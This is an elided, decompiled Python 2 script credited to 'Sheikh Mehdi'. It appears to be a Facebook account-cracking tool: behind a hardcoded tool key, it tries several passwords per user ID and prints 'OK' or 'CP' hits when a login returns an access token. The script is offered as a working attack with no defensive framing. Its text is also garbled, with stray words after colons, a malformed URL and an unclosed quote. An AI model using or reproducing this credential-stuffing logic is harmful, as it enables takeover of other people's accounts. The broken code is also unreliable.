...
# Decompiled By SHEIKH MEHDI 

# Github : https://github.com/Sheikhmehdi

# uncompyle6 version 

# Original written By Sheikh Mehdi

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass

__author__ = 'Sheikh Mehdi'

__copyright = 'All rights reserved . Copyright  Sheikh-Brand'

CorrectUsername = 'sheikh'
...
while (loop == 'true'):
    ...
    username = raw_input('\033[1;91mENTER TOOL KEY…………=>> :sheikh ')

    if (username == CorrectUsername):sheikh

            print '\033[1;92m Logged in successfully as '

            time.sleep(1)

            os.system('xdg-open https://https://www.facebook.com/mehdihasan20)
        ...
        os.system('xdg-open https://www.facebook.com/mehdihasan20')
...
logo = """
 ...
 Facebook :          https://www.facebook.com/mehdihasan20

 GitHub   :        github.com/Sheikhmehdi
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[92m  [KAUSAR_OK]  ' + k + c + user + '  |  ' + pass1
                ...
                print '\x1b[1;91m  [KAUSAR_CP]' + k + c + user + '  |  ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;92m  [KAUSAR_OK] ' + k + c + user + '  |  ' + pass2
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;92m  [KAUSAR_OK]  ' + k + c + user + '  |  ' + pass3
...
if __name__ == '__main__':Sheikh Mehdi
